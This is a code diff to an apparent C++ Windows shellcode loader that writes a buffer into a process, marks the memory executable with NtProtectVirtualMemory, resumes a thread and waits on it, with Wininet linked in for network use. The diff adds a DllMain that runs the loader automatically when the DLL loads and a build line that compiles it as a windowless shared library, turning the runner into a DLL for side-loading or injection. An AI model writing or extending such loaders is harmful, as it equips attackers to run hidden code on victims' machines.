@@ -16,7 +16,7 @@ typedef std::string String;
 #else
 typedef std::wstring String;
 #endif
-#define size size 1024 * 1024
+#define size size 1024 * 60
 unsigned char Buffer[size];
 
 unsigned int Buffer_len = sizeof(Buffer);
@@ -130,9 +130,30 @@ int main()
 		res = NtProtectVirtualMemory(hProc, &base_addr, (PSIZE_T)&Buffer_len, PAGE_EXECUTE_READ, &oldprotect);
 		res = NtResumeThread(thandle, 0);
 		res = NtWaitForSingleObject(thandle, -1, NULL);
-		//InternetCloseHandle(internet);
+		// InternetCloseHandle(internet);
 	}
 	return 0;
 }
 
+BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
+{ // HANDLE threadhandle;
+	switch (dwReason)
+	{
+	case DLL_PROCESS_ATTACH:
+		main();
+		// threadhandle = CreateThread(NULL, 0, main, NULL, 0, NULL);
+		// CloseHandle(threadhandle);
+		break;
+	case DLL_PROCESS_DETACH:
+		break;
+	case DLL_THREAD_ATTACH:
+		break;
+	case DLL_THREAD_DETACH:
+		break;
+	}
+	return TRUE;
+}
+
 // x86_64-w64-mingw32-g++ CurrentThread.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows
+
+//x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -lWininet -Wl,--subsystem,windows -shared -o
